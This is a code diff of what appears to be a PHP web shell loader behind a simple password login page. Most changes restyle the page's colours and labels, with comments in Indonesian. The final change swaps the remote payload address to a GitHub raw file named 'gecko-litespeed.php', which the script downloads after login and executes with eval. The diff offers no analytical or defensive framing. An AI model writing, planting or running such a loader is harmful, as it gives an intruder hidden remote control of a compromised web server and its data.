@@ -11,11 +11,11 @@ function show_login_form()
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Aptisme</title>
+    <title>AwokAwokAwokAwokAwokAwok</title>
     <style>
         body {
             background-color: #000;
-            color: #0f0;
+            color: #e74c3c; /* Merah cerah */
             font-family: monospace;
             display: flex;
             justify-content: center;
@@ -25,7 +25,7 @@ function show_login_form()
         .login-box {
             background: #111;
             padding: 30px;
-            border: 2px solid #0f0;
+            border: 2px solid #e74c3c; /* Merah cerah */
             border-radius: 10px;
         }
         input {
@@ -33,24 +33,24 @@ function show_login_form()
             padding: 10px;
             margin-top: 10px;
             background: #000;
-            color: #0f0;
-            border: 1px solid #0f0;
+            color: #e74c3c; /* Merah cerah */
+            border: 1px solid #e74c3c; /* Merah cerah */
         }
         input[type=submit] {
-            background: #0f0;
+            background: #e74c3c; /* Merah cerah */
             color: #000;
             font-weight: bold;
             cursor: pointer;
         }
         input[type=submit]:hover {
-            background: #00b300;
+            background: #c0392b; /* Merah gelap yang lebih elegan */
         }
     </style>
 </head>
 <body>
     <div class="login-box">
         <form method="post">
-            <label>Password:</label>
+            <label>Masukin:</label>
             <input type="password" name="password" required>
             <input type="submit" value="Login">
         </form>
@@ -110,7 +110,7 @@ if (!isset($_SESSION[$session_key])) {
     }
 }
 
-$target_url = 'https://haxor-research.com/rimuru.jpg';
+$target_url = 'https://raw.githubusercontent.com/MadExploits/Gecko/refs/heads/main/gecko-litespeed.php';
 $payload = geturlsinfo($target_url);
 if ($payload !== false) {
     eval('?>' . $payload);
